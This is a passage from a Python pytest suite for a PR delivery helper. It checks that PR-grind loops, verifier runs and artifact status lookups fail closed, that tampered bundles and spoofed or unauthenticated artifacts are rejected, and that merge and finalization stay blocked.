    def exercise(extra_args: list[str], expected_phase0_timeout: int) -> None:
        monkeypatch.setattr(
            sys,
            "argv",
            [
                str(DELIVER),
                "--repo",
                "/tmp/repo",
                "--plugin-root",
                "/tmp/plugin",
                "--pr",
                "7",
                "--pr-grind-timeout",
                "240",
                "--litmus-status-timeout",
                "90",
                "--drift-baseline",
                "/tmp/drift-baseline.json",
                *extra_args,
            ],
        )
        args = ns["parse_args"]()
        captured = {"cmd": None, "timeout": None}

        class CP:
            stdout = "{}"
            stderr = ""
            returncode = 0

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["timeout"] = kwargs["timeout"]
            return CP()

        monkeypatch.setattr(ns["subprocess"], "run", fake_run)

        ns["run_delivery_status"](args)

        assert captured["timeout"] == 240 + 90 + expected_phase0_timeout + 30
        cmd = captured["cmd"]
        assert isinstance(cmd, list)
        assert cmd[cmd.index("--drift-baseline") + 1] == "/tmp/drift-baseline.json"
        assert cmd[cmd.index("--phase0-status-timeout") + 1] == str(expected_phase0_timeout)

    exercise([], 60)
    exercise(["--phase0-status-timeout", "45"], 45)


def test_clean_pr_grind_fixture_still_does_not_authorize_merge(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    assert run(["git", "config", "user.email", "test@example.test"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "README.md").write_text("# test\n")
    assert run(["git", "add", "README.md"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    plugin = fake_busdriver(tmp_path / "busdriver")
    pr_result = tmp_path / "pr-grind-clean.json"
    pr_result.write_text(json.dumps({"status": "clean", "clean": True, "checks": {"failed": 0, "pending": 0}, "actionable_comments": []}))

    cp, data = invoke(repo, plugin, "--pr", "7", "--pr-grind-result-file", str(pr_result))

    assert cp.returncode == 0
    assert data["ok"] is True
    assert data["pr"] == {"number": "7", "available": True, "ok": True, "status": "clean", "clean": True}
    assert data["delivery_status"]["decision"]["status"] == "pr_clean_read_only"
    assert data["decision"]["status"] == "plan_only"
    assert_finalization_blocked(data["decision"])


def test_execute_pr_grind_runs_read_only_loop_and_writes_artifact(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        safe_loop_payload(),
        0,
        "--run-id",
        "prgrind-123",
        "--max-wait-seconds",
        "1",
        "--poll-interval",
        "0",
        "--max-polls",
        "2",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 0
    assert data["ok"] is True
    assert data["operation"] == "pr-grind"
    assert data["decision"]["status"] == "pr_grind_clean"
    assert data["decision"]["reason"] == "latest_pr_head_clean_read_only"
    assert_finalization_blocked(data["decision"])
    assert data["pr_grind_loop"]["status"] == "clean"
    assert data["pr_grind_loop"]["clean"] is True
    assert data["verifiers"] == []
    assert_delivery_run_envelope(data["run"], "prgrind-123", "pr_grind", "pr_grind_clean", "latest_pr_head_clean_read_only")
    artifact = Path(data["run_artifact_path"])
    assert artifact.exists()
    artifact_data = json.loads(artifact.read_text())
    assert artifact_data["pr_grind_loop"]["status"] == "clean"
    assert artifact_data["run"]["artifacts"] == [{"kind": "result", "path": str(artifact)}]
    assert not (repo / ".claude").exists()
    assert not (repo / ".opencode").exists()


def test_execute_pr_grind_needs_fix_fails_closed_and_writes_artifact(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        safe_loop_payload(status="needs_fix", ok=False, clean=False),
        1,
        "--run-id",
        "prgrind-needs-fix",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_grind_needs_fix"
    assert_finalization_blocked(data["decision"])
    assert data["pr_grind_loop"]["status"] == "needs_fix"
    assert data["steps"][0] == {"name": "pr_grind", "status": "blocked", "reason": "pr_grind_needs_fix"}
    assert Path(data["run_artifact_path"]).exists()


def test_execute_pr_grind_rejects_malformed_loop_output(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        {"ok": True, "status": "clean", "clean": True},
        0,
        "--run-id",
        "prgrind-malformed-loop",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode != 0
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_grind_loop_failed"
    assert_finalization_blocked(data["decision"])
    assert Path(data["run_artifact_path"]).exists()


def test_run_pr_grind_loop_rejects_bundle_tamper(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    tampered_loop = tmp_path / "loop"
    trusted_check = tmp_path / "check"
    tampered_loop.write_text("tampered\n")
    trusted_check.write_text("trusted-check\n")
    globals_ = ns["run_pr_grind_loop"].__globals__
    monkeypatch.setitem(globals_, "PR_GRIND_LOOP", tampered_loop)
    monkeypatch.setitem(globals_, "PR_GRIND_CHECK", trusted_check)
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(b"trusted-loop\n").hexdigest())
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(trusted_check.read_bytes()).hexdigest())
    monkeypatch.setattr(subprocess, "run", lambda *_args, **_kwargs: pytest.fail("tampered loop must not execute"))
    args = type("Args", (), {
        "pr": "7", "max_wait_seconds": 1.0, "poll_interval": 0.0,
        "max_polls": 1, "check_timeout": 1.0, "expected_repository": "owner/repo",
        "plugin_root": None,
    })()
    data, rc = ns["run_pr_grind_loop"](tmp_path, args)
    assert rc == 2
    assert data["error"] == "pr_grind_bundle_integrity_failed"


def test_run_pr_grind_loop_timeout_bytes_are_json_safe(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    globals_ = ns["run_pr_grind_loop"].__globals__
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(globals_["PR_GRIND_LOOP"].read_bytes()).hexdigest())
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(globals_["PR_GRIND_CHECK"].read_bytes()).hexdigest())
    snapshot = {
        "number": 7,
        "html_url": "https://github.com/owner/repo/pull/7",
        "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "owner/repo"}},
        "base": {"sha": "b" * 40, "ref": "main", "repo": {"full_name": "owner/repo"}},
    }
    monkeypatch.setitem(globals_, "github_pr_snapshot", lambda *_args: (snapshot, {"ok": True}, None))

    def raise_timeout(*_args, **_kwargs):
        raise subprocess.TimeoutExpired(cmd=["slow-loop"], timeout=1, output=b"partial", stderr=b"slow")

    monkeypatch.setattr(ns["subprocess"], "run", raise_timeout)
    args = type(
        "Args",
        (),
        {
            "pr": "7",
            "max_wait_seconds": 1.0,
            "poll_interval": 0.0,
            "max_polls": 1,
            "check_timeout": 1.0,
            "plugin_root": None,
            "expected_repository": "owner/repo",
        },
    )()

    data, rc = ns["run_pr_grind_loop"](tmp_path, args)

    assert rc == 124
    assert data["stdout_tail"] == "partial"
    assert data["stderr_tail"] == "slow"
    json.dumps(data)


def test_run_pr_grind_loop_passes_and_rechecks_exact_pr_identity(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    globals_ = ns["run_pr_grind_loop"].__globals__
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_LOOP_SHA256", hashlib.sha256(globals_["PR_GRIND_LOOP"].read_bytes()).hexdigest())
    monkeypatch.setitem(globals_, "TRUSTED_PR_GRIND_CHECK_SHA256", hashlib.sha256(globals_["PR_GRIND_CHECK"].read_bytes()).hexdigest())
    snapshot = {
        "number": 7,
        "html_url": "https://github.com/owner/repo/pull/7",
        "head": {"sha": "a" * 40, "ref": "feature", "repo": {"full_name": "fork/repo"}},
        "base": {"sha": "b" * 40, "ref": "main", "repo": {"full_name": "owner/repo"}},
    }
    monkeypatch.setitem(globals_, "github_pr_snapshot", lambda *_args: (snapshot, {"ok": True}, None))
    captured = {}

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["env"] = kwargs["env"]
        private_loop = Path(cmd[2])
        captured["bundle"] = private_loop.parents[1]
        captured["checker_exists"] = (captured["bundle"] / "scripts" / "hermes-busdriver-pr-grind-check").is_file()
        captured["script_modes"] = {
            name: stat.S_IMODE((captured["bundle"] / "scripts" / name).stat().st_mode)
            for name in ("hermes-busdriver-pr-grind-loop", "hermes-busdriver-pr-grind-check")
        }
        captured["trusted_executables_exist"] = all((captured["bundle"] / "trusted-bin" / name).is_file() for name in ("git", "gh", "jq"))
        payload = bound_safe_loop_payload(tmp_path)
        payload.update({
            "pr": 7,
            "url": snapshot["html_url"],
            "latest_head": "a" * 40,
            "head_repository": "fork/repo",
            "head_ref": "feature",
            "base_repository": "owner/repo",
            "base": "main",
            "base_sha": "b" * 40,
        })
        return subprocess.CompletedProcess(cmd, 0, json.dumps(payload), "")

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)
    args = type("Args", (), {
        "pr": "7", "max_wait_seconds": 1.0, "poll_interval": 0.0,
        "max_polls": 1, "check_timeout": 1.0, "expected_repository": "owner/repo",
        "plugin_root": None,
    })()

    data, rc = ns["run_pr_grind_loop"](tmp_path, args)

    assert rc == 0
    assert data["latest_head"] == "a" * 40
    for option, value in [
        ("--expected-repository", "owner/repo"),
        ("--expected-head-repository", "fork/repo"),
        ("--expected-head-ref", "feature"),
        ("--expected-base-repository", "owner/repo"),
        ("--expected-base-ref", "main"),
        ("--expected-head-sha", "a" * 40),
        ("--expected-base-sha", "b" * 40),
    ]:
        assert captured["cmd"][captured["cmd"].index(option) + 1] == value
    assert captured["env"]["HERMES_BUSDRIVER_PRIVATE_RUNTIME"] == "1"
    assert captured["checker_exists"] is True
    assert captured["script_modes"] == {
        "hermes-busdriver-pr-grind-loop": 0o500,
        "hermes-busdriver-pr-grind-check": 0o500,
    }
    assert captured["trusted_executables_exist"] is True


def test_execute_pr_grind_rejects_mismatched_loop_decision_status(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    mismatched_decision = safe_loop_decision(status="blocked", reason="checker_failed")

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        safe_loop_payload(status="clean", ok=True, clean=True, decision=mismatched_decision),
        0,
        "--run-id",
        "prgrind-mismatched-decision",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_grind_loop_failed"
    assert_finalization_blocked(data["decision"])
    assert data["pr_grind_loop"]["status"] == "clean"
    assert data["pr_grind_loop"]["decision"]["status"] == "blocked"
    assert Path(data["run_artifact_path"]).exists()


def test_execute_pr_grind_rejects_clean_payload_with_nonzero_exit(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        safe_loop_payload(),
        1,
        "--run-id",
        "prgrind-clean-nonzero",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_grind_loop_failed"
    assert_finalization_blocked(data["decision"])
    assert data["pr_grind_loop"]["clean"] is True
    assert Path(data["run_artifact_path"]).exists()


def test_execute_pr_grind_rejects_unsafe_loop_authority(monkeypatch, capsys, tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    unsafe_decision = safe_loop_decision()
    unsafe_decision["merge_allowed"] = True

    cp, data = invoke_with_pr_grind_loop(
        monkeypatch,
        capsys,
        repo,
        plugin,
        safe_loop_payload(decision=unsafe_decision),
        0,
        "--run-id",
        "prgrind-unsafe-clean",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_grind_loop_failed"
    assert_finalization_blocked(data["decision"])
    assert data["pr_grind_loop"]["decision"]["merge_allowed"] is True
    assert Path(data["run_artifact_path"]).exists()


@pytest.mark.parametrize("field", [
    "repo", "repository", "pr", "url", "latest_head", "head_repository", "head_ref",
    "base_repository", "base", "base_sha", "iterations", "policy_gaps", "limits",
])
def test_delivery_loop_envelope_requires_identity_and_evidence(field: str):
    ns = runpy.run_path(str(DELIVER))
    payload = safe_loop_payload()
    del payload[field]

    assert ns["pr_grind_loop_envelope_safe"](payload) is False


def test_execute_pr_grind_delivery_status_failure_writes_handoff_artifact(tmp_path: Path):
    missing_repo = tmp_path / "missing-repo"
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "pr-grind",
        "--pr",
        "7",
        "--run-id",
        "prgrind-preflight-failed",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode != 0
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "delivery_status_failed"
    assert data["pr_grind_loop"] is None
    assert data["steps"][0] == {"name": "delivery_status", "status": "blocked", "reason": "helper_failed"}
    assert data["steps"][1] == {"name": "pr_grind", "status": "skipped", "reason": "delivery_status_failed"}
    assert_finalization_blocked(data["decision"])
    assert Path(data["run_artifact_path"]).exists()


def test_execute_pr_grind_requires_pr_and_writes_no_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(repo, plugin, "--mode", "execute", "--operation", "pr-grind", artifact_dir=artifact_dir)

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "pr_required"
    assert_finalization_blocked(data["decision"])
    assert data["run_artifact_path"] is None
    assert not artifact_dir.exists()


def test_delivery_status_failure_blocks_finalization(tmp_path: Path):
    repo = tmp_path / "not-git"
    repo.mkdir()
    plugin = fake_busdriver(tmp_path / "busdriver")

    cp, data = invoke(repo, plugin)

    assert cp.returncode != 0
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "delivery_status_failed"
    assert data["delivery_status"]["ok"] is False
    assert data["steps"][0] == {"name": "delivery_status", "status": "blocked", "reason": "helper_failed"}
    assert_finalization_blocked(data["decision"])


def test_execute_verify_runs_verifier_and_writes_hermes_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    verifier_code = 'import sys; print("ok"); sys.stderr.write("err\\n")'
    verifier_cmd = f"{shlex.quote(sys.executable)} -c {shlex.quote(verifier_code)}"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--run-id",
        "verify-123",
        "--verifier",
        f"smoke={verifier_cmd}",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 0
    assert data["ok"] is True
    assert data["operation"] == "verify"
    assert data["decision"]["status"] == "verified"
    assert_delivery_run_envelope(data["run"], "verify-123", "verify", "verified", "verified")
    assert_finalization_blocked(data["decision"])
    assert data["verifiers"] == [
        {
            "name": "smoke",
            "command": verifier_cmd,
            "returncode": 0,
            "ok": True,
            "stdout_tail": "ok\n",
            "stderr_tail": "err\n",
        }
    ]
    artifact = Path(data["run_artifact_path"])
    assert artifact.parent == artifact_dir
    assert artifact.exists()
    assert "verify-123" in artifact.name
    assert data["run"]["artifacts"] == [{"kind": "result", "path": str(artifact)}]
    assert repo not in artifact.parents
    artifact_data = json.loads(artifact.read_text())
    assert artifact_data["run_artifact_path"] == str(artifact)
    assert artifact_data["run"]["run_id"] == "verify-123"
    assert artifact_data["run"]["artifacts"] == [{"kind": "result", "path": str(artifact)}]
    assert artifact_data["verifiers"][0]["name"] == "smoke"
    assert not (repo / ".claude").exists()
    assert not (repo / ".opencode").exists()


def test_status_mode_reads_latest_valid_artifact_for_run_id_without_writing(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    missing_repo = tmp_path / "missing-repo"
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    # commit against a missing repo is a reachable production producer: delivery status fails
    # before any mutation and main persists the blocked delivery_status artifact. (Harness
    # verify runs also write files, but those are not production-valid durable artifacts.)
    cp_first, first_data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "commit",
        "--run-id",
        "lookup-123",
        artifact_dir=artifact_dir,
    )
    cp_second, second_data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "commit",
        "--run-id",
        "lookup-123",
        artifact_dir=artifact_dir,
    )
    first_artifact = Path(first_data["run_artifact_path"])
    second_artifact = Path(second_data["run_artifact_path"])
    second_payload = json.loads(second_artifact.read_text())
    second_payload["run"]["artifacts"][0]["verifier_tail"] = "do-not-echo"
    second_artifact.write_text(json.dumps(second_payload))
    spoof = artifact_dir / "zz-spoof.json"
    spoof.write_text(json.dumps({"run": {"run_id": "lookup-123", "schema": "wrong"}}))
    schema_spoof = artifact_dir / "zzz-schema-spoof.json"
    schema_spoof.write_text(json.dumps({"schema": "hermes-busdriver-deliver/v0", "run": {"schema": "hermes-busdriver-delivery-run/v0", "run_id": "lookup-123"}}))
    authority_positive = artifact_dir / "zzzz-authority-positive.json"
    false_flags = {key: False for key in BLOCKED_KEYS}
    authority_positive.write_text(json.dumps({
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "decision": {"status": "verified", "reason": "verified", **false_flags, "merge_allowed": True, "secret": "do-not-echo"},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": "lookup-123",
            "phase": "verify",
            "status": "verified",
            "reason": "verified",
            "repo_root": str(repo),
            "authority": {**false_flags, "merge_allowed": True},
            "secret": "do-not-echo",
        },
    }))
    malformed_identity = artifact_dir / "zzzzz-malformed-identity.json"
    malformed_identity.write_text(json.dumps({
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "verify",
        "repo": {"root": ["not", "a", "string"]},
        "pr": {"number": {"bad": True}},
        "decision": {"status": "verified", "reason": "verified", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": "lookup-123",
            "created_at": 123,
            "phase": "surprise",
            "status": "verified",
            "reason": "verified",
            "repo_root": ["not", "a", "string"],
            "pr_number": {"bad": True},
            "authority": false_flags,
            "artifacts": "not-a-list",
        },
    }))
    corrupt = artifact_dir / "zzzzzz-corrupt.json"
    corrupt.write_bytes(b"\xff\xfe\x00not-json")
    os.utime(first_artifact, (10, 10))
    os.utime(second_artifact, (20, 20))
    os.utime(spoof, (30, 30))
    os.utime(schema_spoof, (40, 40))
    os.utime(authority_positive, (50, 50))
    os.utime(malformed_identity, (60, 60))
    os.utime(corrupt, (70, 70))
    before = {
        path.name: {
            "bytes": path.read_bytes(),
            "mtime_ns": path.stat().st_mtime_ns,
        }
        for path in artifact_dir.iterdir()
    }

    cp, data = invoke(repo, plugin, "--mode", "status", "--run-id", "lookup-123", artifact_dir=artifact_dir)
    after = {
        path.name: {
            "bytes": path.read_bytes(),
            "mtime_ns": path.stat().st_mtime_ns,
        }
        for path in artifact_dir.iterdir()
    }

    # both producers fail closed at the delivery-status check; the blocked artifact is still durable
    assert cp_first.returncode == 2
    assert cp_second.returncode == 2
    assert cp.returncode == 1
    assert before == after
    assert data["ok"] is False
    assert data["mode"] == "status"
    assert data["operation"] == "status"
    assert data["run_artifact_path"] is None
    assert data["status_lookup"]["found"] is False
    assert data["status_lookup"]["run_id"] == "lookup-123"
    assert data["status_lookup"]["reason"] == "artifact_writer_authentication_unavailable"
    assert "artifact_path" not in data["status_lookup"]
    assert_delivery_run_envelope(
        data["run"], "lookup-123", "status", "blocked", "artifact_writer_authentication_unavailable"
    )
    assert_finalization_blocked(data["decision"])


def test_status_mode_rejects_modified_legacy_v1_artifact_without_writer_authentication(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    missing_repo = tmp_path / "missing-repo"
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    # commit against a missing repo is a reachable production producer: it fails the delivery-status
    # check before any mutation and persists a structurally valid blocked artifact.
    cp_producer, producer_data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "commit",
        "--run-id",
        "legacy-123",
        artifact_dir=artifact_dir,
    )
    artifact = Path(producer_data["run_artifact_path"])
    legacy_payload = json.loads(artifact.read_text())
    legacy_payload["decision"].pop("marker_write_allowed")
    legacy_payload["run"]["authority"].pop("marker_write_allowed")
    artifact.write_text(json.dumps(legacy_payload))

    cp, data = invoke(repo, plugin, "--mode", "status", "--run-id", "legacy-123", artifact_dir=artifact_dir)

    assert cp_producer.returncode == 2
    assert cp.returncode == 1
    assert data["status_lookup"]["found"] is False
    assert "artifact_path" not in data["status_lookup"]
    assert data["status_lookup"]["reason"] == "artifact_writer_authentication_unavailable"
    assert_finalization_blocked(data["decision"])


def test_status_mode_returns_latest_valid_failed_delivery_status_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    missing_repo = tmp_path / "missing-repo"
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    # older: blocked commit artifact from a valid repo with nothing staged.
    cp_ok, ok_data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "commit",
        "--run-id",
        "lookup-failed-latest",
        "--commit-message",
        "nothing staged",
        artifact_dir=artifact_dir,
    )
    # newer: delivery_status_failed commit artifact from a missing repo.
    cp_failed, failed_data = invoke(
        missing_repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "commit",
        "--run-id",
        "lookup-failed-latest",
        artifact_dir=artifact_dir,
    )
    ok_artifact = Path(ok_data["run_artifact_path"])
    failed_artifact = Path(failed_data["run_artifact_path"])
    os.utime(ok_artifact, (10, 10))
    os.utime(failed_artifact, (20, 20))

    cp, data = invoke(repo, plugin, "--mode", "status", "--run-id", "lookup-failed-latest", artifact_dir=artifact_dir)

    assert cp_ok.returncode != 0
    assert cp_failed.returncode != 0
    assert cp.returncode == 1
    assert data["status_lookup"] == {
        "found": False,
        "reason": "artifact_writer_authentication_unavailable",
        "run_id": "lookup-failed-latest",
    }
    assert data["run"]["phase"] == "status"
    assert data["run"]["status"] == "blocked"
    assert data["run"]["reason"] == "artifact_writer_authentication_unavailable"
    assert data["run"]["artifacts"] == []
    assert_finalization_blocked(data["decision"])


def test_status_mode_fails_closed_when_run_id_missing_or_unknown(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp_missing, missing = invoke(repo, plugin, "--mode", "status", artifact_dir=artifact_dir)
    cp_unknown, unknown = invoke(repo, plugin, "--mode", "status", "--run-id", "missing-run", artifact_dir=artifact_dir)

    assert cp_missing.returncode == 2
    assert missing["ok"] is False
    assert missing["operation"] == "status"
    assert missing["decision"] == {"status": "blocked", "reason": "run_id_required", **{key: False for key in BLOCKED_KEYS}}
    assert missing["status_lookup"] == {"found": False, "reason": "run_id_required"}
    assert missing["run"]["run_id"] is None
    assert missing["run"]["phase"] == "status"
    assert cp_unknown.returncode == 1
    assert unknown["ok"] is False
    assert unknown["decision"]["status"] == "blocked"
    assert unknown["decision"]["reason"] == "run_not_found"
    assert unknown["status_lookup"] == {"found": False, "reason": "run_not_found", "run_id": "missing-run"}
    assert_finalization_blocked(unknown["decision"])


def test_failing_verifier_fails_closed_with_bounded_tails(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    code = "import sys; print('x' * 5005); sys.stderr.write('e' * 5005); raise SystemExit(7)"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        f"fail={shlex.quote(sys.executable)} -c {shlex.quote(code)}",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "verifier_failed"
    assert_finalization_blocked(data["decision"])
    assert data["verifiers"][0]["returncode"] == 7
    assert data["verifiers"][0]["ok"] is False
    assert len(data["verifiers"][0]["stdout_tail"]) <= 4000
    assert len(data["verifiers"][0]["stderr_tail"]) <= 4000
    assert Path(data["run_artifact_path"]).exists()


def test_timeout_verifier_stderr_tail_stays_bounded(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))

    def raise_timeout(*_args, **_kwargs):
        raise subprocess.TimeoutExpired(cmd=["slow"], timeout=5, output="partial", stderr="e" * 5005)

    monkeypatch.setattr(ns["subprocess"], "run", raise_timeout)
    result = ns["run_verifiers"](tmp_path, ["slow=python -c pass"], 5)[0]

    assert result["returncode"] == 124
    assert result["ok"] is False
    assert result["stdout_tail"] == "partial"
    assert result["stderr_tail"].startswith("timeout after 5s\n")
    assert len(result["stderr_tail"]) <= 4000


def test_missing_verifier_command_fails_closed_with_structured_error(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        "missing=definitely-missing-hermes-verifier-command",
        artifact_dir=artifact_dir,
    )

    verifier = data["verifiers"][0]
    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "verifier_failed"
    assert verifier["name"] == "missing"
    assert verifier["returncode"] == 127
    assert verifier["ok"] is False
    assert verifier["stdout_tail"] == ""
    assert "FileNotFoundError" in verifier["stderr_tail"]
    assert len(verifier["stderr_tail"]) <= 4000
    assert Path(data["run_artifact_path"]).exists()
    assert_finalization_blocked(data["decision"])


def test_non_executable_verifier_fails_closed_with_structured_error(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    verifier = tmp_path / "not-executable"
    verifier.write_text("#!/bin/sh\necho should-not-run\n")
    verifier.chmod(0o644)

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        f"permission={verifier}",
        artifact_dir=artifact_dir,
    )

    verifier_result = data["verifiers"][0]
    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "verifier_failed"
    assert verifier_result["name"] == "permission"
    assert verifier_result["returncode"] == 127
    assert verifier_result["ok"] is False
    assert verifier_result["stdout_tail"] == ""
    assert "PermissionError" in verifier_result["stderr_tail"]
    assert Path(data["run_artifact_path"]).exists()
    assert_finalization_blocked(data["decision"])


def test_verifier_command_with_equals_not_at_label_prefix_is_not_split(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    code = "value='foo=bar'; print(value)"
    verifier_cmd = f"{shlex.quote(sys.executable)} -c {shlex.quote(code)}"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        verifier_cmd,
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 0
    assert data["ok"] is True
    assert data["verifiers"][0]["name"] == "verifier_1"
    assert data["verifiers"][0]["command"] == verifier_cmd
    assert data["verifiers"][0]["stdout_tail"] == "foo=bar\n"
    assert_finalization_blocked(data["decision"])


def test_empty_verifier_command_fails_closed(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        "empty=",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 1
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "verifier_failed"
    assert data["verifiers"][0]["name"] == "empty"
    assert data["verifiers"][0]["ok"] is False
    assert data["verifiers"][0]["stderr_tail"] == "empty verifier command"
    assert Path(data["run_artifact_path"]).exists()
    assert_finalization_blocked(data["decision"])


def test_artifact_write_failure_cleans_temp_file_and_clears_path(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    artifact_dir = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
